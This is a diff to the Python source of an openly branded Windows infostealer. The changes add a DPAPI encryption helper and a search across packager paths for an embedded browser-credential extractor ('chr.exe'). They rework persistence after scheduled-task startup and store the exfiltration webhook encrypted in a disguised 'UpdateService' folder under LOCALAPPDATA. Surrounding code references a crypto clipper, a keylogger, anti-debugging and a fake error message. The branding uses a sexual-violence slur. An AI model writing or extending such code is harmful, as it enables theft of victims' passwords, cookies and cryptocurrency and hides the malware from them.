@@ -3,7 +3,7 @@
 # https://t.me/RapeStealer
 
 import ctypes, platform
-import json, sys
+import json, sys, subprocess
 import shutil
 import sqlite3
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -102,7 +102,28 @@ class SubModules:
             ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
             return bytes(data)
 
-        raise ValueError("Invalid encrypted_data provided!")
+    @staticmethod
+    def CryptProtectData(data: bytes, optional_entropy: str = None) -> bytes:
+        class DATA_BLOB(ctypes.Structure):
+            _fields_ = [
+                ("cbData", ctypes.c_ulong),
+                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
+            ]
+        
+        pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
+        pDataOut = DATA_BLOB()
+        pOptionalEntropy = None
+        
+        if optional_entropy is not None:
+            optional_entropy = optional_entropy.encode("utf-16")
+            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
+            
+        if ctypes.windll.crypt32.CryptProtectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
+            data = (ctypes.c_ubyte * pDataOut.cbData)()
+            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
+            ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
+            return bytes(data)
+        raise ValueError("Encryption failed.")
 
     @staticmethod
     def GetKey(FilePath:str) -> bytes:
@@ -273,10 +294,30 @@ class Chromelevator:
     async def Run(temp_path: str):
         try:
             # Determine path to embedded exe
+            # Determine path to embedded exe
+            possible_paths = []
             if hasattr(sys, '_MEIPASS'):
-                exe_path = os.path.join(sys._MEIPASS, "chr.exe")
-            else:
-                exe_path = os.path.join(os.getcwd(), "chr", "chr.exe")
+                possible_paths.append(os.path.join(sys._MEIPASS, "chr.exe"))
+            
+            # Nuitka / Script paths
+            try:
+                possible_paths.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), "chr.exe"))
+            except: pass
+
+            try:
+                possible_paths.append(os.path.join(os.path.dirname(sys.executable), "chr.exe"))
+            except: pass
+            
+            possible_paths.append(os.path.join(os.getcwd(), "chr", "chr.exe"))
+            
+            if os.environ.get("NUITKA_ONEFILE_PARENT"):
+                possible_paths.append(os.path.join(os.environ.get("NUITKA_ONEFILE_PARENT"), "chr.exe"))
+
+            exe_path = None
+            for p in possible_paths:
+                if os.path.exists(p):
+                    exe_path = p
+                    break
 
             dest_path = os.path.join(temp_path, "chr.exe")
             output_dir = os.path.join(temp_path, "CE_Output")
@@ -2421,13 +2462,8 @@ class Startup:
             if startup_method == "schtasks" or CryptoClipperEnabled or KeyloggerEnabled:
                  await self.SchtaskStartup()
             
-            # Execute the new copy
-            print("[+] Executing new copy...")
-            subprocess.Popen([self.PermanentPath], shell=True) 
-            
-            # Terminate self
-            print("[+] Terminating self...")
-            os._exit(0)
+            # Continue execution from current process (do not switch to persistent copy immediately)
+            print("[+] Persistence installed. Continuing execution...")
             
         except Exception as e:
             print(f"[-] Installation failed: {e}")
@@ -2714,6 +2750,58 @@ if __name__ == '__main__':
             asyncio.run(AntiDebug().FunctionRunner())
             if (startup_method != "no-startup") or CryptoClipperEnabled or KeyloggerEnabled:
                 asyncio.run(Startup().main())
+            
+            # Webhook integrity check
+            # Webhook integrity check
+            try:
+                service_path = os.path.join(os.getenv('LOCALAPPDATA'), "RapeUpdateService")
+                config_path = os.path.join(service_path, "config.dat")
+                
+                # Check if we need to reset
+                reset_needed = False
+                if os.path.exists(config_path):
+                    try:
+                        with open(config_path, "rb") as f:
+                            encrypted_data = f.read()
+                            # Try to decrypt. If it fails or mismatches, we reset.
+                            decrypted_webhook = SubModules.CryptUnprotectData(encrypted_data).decode()
+                            if decrypted_webhook != webhook:
+                                reset_needed = True
+                    except:
+                        reset_needed = True
+                else:
+                    # If config doesn't exist but folder does, we might want to reset or just save.
+                    # But if we want to be strict: if folder exists but no config -> reset
+                    if os.path.exists(service_path):
+                        reset_needed = True
+
+                if reset_needed:
+                    try:
+                        # Iterate and remove all items in the directory to avoid permission issues with the dir itself or valid behavior
+                        for filename in os.listdir(service_path):
+                            file_path = os.path.join(service_path, filename)
+                            try:
+                                if os.path.isfile(file_path) or os.path.islink(file_path):
+                                    os.unlink(file_path)
+                                elif os.path.isdir(file_path):
+                                    shutil.rmtree(file_path)
+                            except Exception as e:
+                                pass
+                    except: 
+                        pass
+                
+                # Ensure directory exists
+                if not os.path.exists(service_path):
+                    os.makedirs(service_path)
+                
+                # Always save the current webhook to ensure it's up to date
+                try:
+                    encrypted_webhook = SubModules.CryptProtectData(webhook.encode())
+                    with open(config_path, "wb") as f:
+                        f.write(encrypted_webhook)
+                except: pass
+            except: pass
+
             asyncio.run(Fakerror())
             main_instance = Main()
             asyncio.run(main_instance.FunctionRunner())
@@ -2723,4 +2811,3 @@ if __name__ == '__main__':
             print(f"\nThe code executed on: {str(time.time() - start_time)} second", end="")
     else:
         print("just Windows Operating system's supported by Rape")
-
